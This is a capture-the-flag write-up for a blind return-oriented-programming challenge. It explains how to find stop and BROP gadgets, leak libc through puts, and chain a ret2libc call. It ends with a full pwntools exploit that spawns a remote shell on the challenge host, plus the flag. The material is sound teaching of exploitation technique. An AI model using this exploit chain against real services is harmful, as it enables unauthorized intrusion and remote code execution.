# Blind

## Challenge

We are given an IP address and port, but no binary or libraries.

When connecting, we are given a prompt and allowed to send a line to the server.
The server will normally respond with a string, then end the connection.

## Solution

This is a fairly standard blind rop challenge.

We first find the buffer size through trial and error, so we know the offset at which the return address is stored.

We can be somewhat confident that PIE is disabled and the base address is the standard 0x400000 for 64-bit binaries or 0x8048000 for 32-bit binaries, so we can test addresses starting from these points.
We are looking for an address that will not cause us to immediately segfault, so we can use this as boolean feedback in later stages.

Once we have this "stop gadget", we want to find the "brop gadget".
This is a gadget that pops 6 values from the stack into specific registers, then returns.
The gadget is useful because it can be used at different offsets to act as a number of other gadgets, such as `pop rdi; ret;`.
It is also useful because it is very unlikely to find another gadget that pops 6 values and returns, meaning that we can be fairly confident that we have found the correct gadget if we see this behaviour.

To find the gadget, we return to the address we wish to test, followed by 6 dummy addresses, then 2 stop gadgets.
The 2 stop gadgets allow us to determine if we have successfully popped all 6 dummy values from the stack.

Once we have found the brop gadget, we can search for a function that allows us to leak memory at a given address.
This is usually a standard printing function, such as `printf` or `puts`.
We can use brop+9 to create a `pop rdi; ret;` gadget.
A good value for RDI when testing for a leaking function is 0x400000 for 64-bit binaries, as we know we can expect to see the ELF header if we reach our target function.

We also need an address near the start of normal execution, such as the start of main, so we can access the vulnerable portion of the binarya gain.
This allows us to use a second ropchain after we have leaked memory.

With a leaking function, we can proceed to determine the libc address by leaking GOT entries.
We can determine what the GOT symbols should be by testing these values.

The libc turned out to be fairly rare, it was not found on most of the libc databases we searched, but it was available [here](https://libcdb.konwur.de/a92373dd129eaecb269c1ecb006f2515).

With all these pieces, we can construct a ret2libc payload to spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 152.96.7.43 --port 1337
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '152.96.7.43'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

libc = ELF("libc-2.31.so")

# newline terminated
# crashes on 0x49 bytes

stop = 0x401028
main = 0x401175
brop = 0x40124a
leak = 0x401028

# dump binary

"""
current_addr = 0x400000

f = open('vuln', 'wb')
while True:
    print("*** READING {} ***".format(hex(current_addr)))
    if b'\n' in pack(current_addr):
        current_addr += 1
        f.write(b'\0')
        continue
    io = start()
    payload = flat({
        0x48: [
            brop+9,
            current_addr,
            leak,
            ],
        })
    io.sendlineafter(b"Can you see me?\n", payload)

    try:
        res = io.recv(timeout=4)
        current_addr += len(res)
        res = res[:-1] + b'\x00'
        print(res)
        f.write(res)
        f.flush()
        io.close()
    except:
        io.close()
        break
f.close()
"""

io = start()
io.sendlineafter(
    b"Can you see me?\n",
    flat({0x48: [brop+9, 0x404018, leak, main]}),
)

dump = unpack(io.recvuntil(b'\n', drop=True).ljust(8, b'\0'))
libc.address = dump - libc.sym['puts']
io.info("LIBC : " + hex(libc.address))
print(hex(dump))

# puts at 0x84420

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh')))
print(rop.dump())

io.sendlineafter(
    b"Can you see me?\n",
    flat({0x48: rop.chain()}),
)

io.interactive()
# io.sendline(flat({0x48: [brop+9, 0x400000, dump]}))
# io.interactive()
```

## Flag

```
HL{9e9d30cf-3c91-4e06-8f38-8ae18e86aff8}
```
